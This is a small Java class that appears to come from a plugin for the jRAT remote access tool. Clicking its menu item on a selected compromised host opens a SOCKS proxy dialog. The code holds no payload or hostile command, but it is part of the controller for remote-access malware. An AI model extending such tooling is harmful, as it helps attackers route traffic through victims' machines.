package se.jrat.plugin.socks.client;

import java.util.List;

import socks.SocksDialog;
import jrat.api.RATMenuItemActionListener;
import jrat.api.RATObject;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<RATObject> servers) {
		try {
			if (servers.size() > 0) {
				final RATObject server = servers.get(0);		
				new SocksDialog(null).setVisible(true);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
